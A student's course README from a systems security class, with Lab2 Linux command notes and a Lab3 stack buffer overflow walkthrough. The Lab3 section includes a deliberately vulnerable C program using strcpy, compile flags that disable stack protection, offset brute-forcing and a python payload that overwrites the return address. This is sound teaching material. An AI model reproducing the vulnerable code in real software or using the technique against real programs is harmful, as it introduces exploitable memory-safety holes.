# washu_sp22_cse523
Systems Security course

## Table of contents
* [Lab1](https://github.com/kbckbc/washu_sp22_cse523/blob/main/lab1.md) : Useful linux command
* [Lab2](https://github.com/kbckbc/washu_sp22_cse523/blob/main/lab2.md) : 
* [Lab3](https://github.com/kbckbc/washu_sp22_cse523/blob/main/lab3.md) : Buffer over flow


## LAB3 - Buffer overflow, 2022-02-09

# Simple buffer overflow example

* What are we going to do?
This example shows that after call strcpy function, just exit program not returning to the point it was called.
To do that, we need to overwrite the return address of strcpy function.

* Overview of process 
1. Set a address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
2. Find where the strcpy return address is.(It's a brute force method)
3. And then, run the c program with the user input which contains the address what you decided in Step 1.

* Steps in detail
1. Compile the c program below like this. '-z execstack' marks the stack as executable.
```
gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
```

2. Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
```
[02/09/22]seed@VM:Byeongchan$ objdump -D ans_check5 | grep -B 1 exit

08048400 <exit@plt>:
--
 80485b3:	6a 00                	push   $0x0
 80485b5:	e8 46 fe ff ff       	call   8048400 <exit@plt>
[02/09/22]seed@VM:Byeongchan$
```

3. Find out where the return address of strcpy function is! This is where brute force method comes in! Try like below changing the number of print count. If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
```
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*47")
ans_buf is at address 0xbf88027c
Right answer!
About to exit!
Segmentation fault
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*48")
ans_buf is at address 0xbf8fe32c
Segmentation fault

```

4. Run like below. Python code will create meaning-less characters followed by exit return address. That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
```
ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
```


# ans_check5.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[32];

  printf("ans_buf is at address %p\n", &ans_buf);

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }
  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }
  printf("About to exit!\n");
  fflush(stdout);
}
```





```



# grep -B 1 exit
-B 1 : exit 찾고 그것만 보여주지 말고 그 전에 한줄도 보여주란 옵션

# grep -A 1 exit
-A 1 : exit 찾고 그것만 보여주지 말고 그 에 한줄도 보여주란 옵션


# gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
-z execstack : make stack executable



# gdb 옵션
-q : 시작시 설명문구 없이 시작

# break <line number> or <function name>
break : 중단점 걸기

# i b
break information 보기

# i r esp
i r : information register
  i r esp : esp 정보 보여줘

# x/32xw $esp
x : 메모리 조사하는 옵션  
o : 8진법으로 보여줌
x : 16진법으로 보여줌
u : 10진법으로 보여줌
t : 2진법으로 보여줌

b : 1 byte 단위로 보여줌(byte)
h : 2 byte 단위로 보여줌(half word)
w: 4 byte 단위로 보여줌(word) - 난 2byte로 알고 있지만 여기선 4바이트로 쓰이나 보다....
g : 8 byte 단위로 보여줌(giant)

i : 역어셈블된 명령어의 명령 메모리를 볼수 있음
c : ASCII 표의 바이트를 자동으로 볼 수 있다.
s : 문자 데이터의 전체 문자열을 보여준다.

  
```




## LAB2 - Linux command, 2022-02-02
```
# date
date --date=”4 hours ago”
date --date=”2 years ago” +%Y%m%d

# vimdiff /bin/date my_date

# Objdump is an executable program on Unix-like system. We can use it as a disassembler to view an executable in assembly form.

# objdump example 
objdump -d {loc}/date | less
objdump -xtrds {loc}/date | less

[-x|--all-headers]
[-t|--syms]
[-r|--reloc]
[-d|--disassemble[=symbol]]
[-s|--full-contents]

# hexa editor
ghex or bless


# readelf - ELF is the object file format used in Linux and many other systems. 
readelf -l {loc}/date : it shows program headers
readelf -S {loc}/date : it shows section headers
readelf -W -s {loc}/date : it shows symbols
readelf -x 16 {loc}/date : it shows in hexadecimal
```
